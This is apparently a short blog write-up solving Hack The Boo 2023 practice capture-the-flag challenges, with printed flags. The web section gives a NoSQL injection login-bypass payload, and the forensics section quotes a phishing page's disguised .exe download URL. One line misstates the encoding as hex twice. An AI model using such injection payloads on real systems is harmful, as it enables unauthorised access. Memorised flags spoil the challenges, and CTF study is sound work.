---
layout: post
title: Hack The Boo - 2023 Practice
date: '2023-10-26 10:02:19 +0300'
image: /assets/img/cover_images/36.png
categories: [CTF, Hack The Boo Practice - 2023 ]
---
## Crypto
### Hexoding
```python
def main():
    first_half = FLAG[:len(FLAG)//2]
    second_half = FLAG[len(FLAG)//2:]

    hex_encoded = to_hex(first_half)
    base64_encoded = to_base64(second_half)

    with open('output.txt', 'w') as f:
        f.write(f'{hex_encoded}\n{base64_encoded}')
```
The first half is hex encoded while the other half is hex encoded. After decoding the output we get the flag
```
HTB{kn0w1ng_h0w_t0_1d3nt1fy_3nc0d1ng_sch3m3s_1s_cruc14l_f0r_a_crypt0gr4ph3r___4ls0_d0_n0t_c0nfus3_enc0d1ng_w1th_encryp510n!}
```
## Forensics
### Spooky Phishing
After opening the index.html file the file tries to download a file from the url with the flag
```
https://windowsliveupdater.htb/HTB{sp00ky_ph1sh1ng_w1th_sp00ky_spr34dsh33ts}/app.xlsx.exe
```
## Reversing
### CandyBowl
We runs strings for the candy bowl binary and boom we get the flag 
```
HTB{4lw4y5_ch3ck_ur_k1d5_c4ndy}
```
## Web 
### CandyVault
The website is using mongodb so we try nosql injection with the following payload
```json
{"email": {"$ne": null}, "password": {"$ne": null} }
```
Then we have to change the content type before sending the request
```
Content-Type: application/json
```
Then we get the page with the flag
```
HTB{w3lc0m3_to0o0o_th3_c44andy_v4u1t!}
```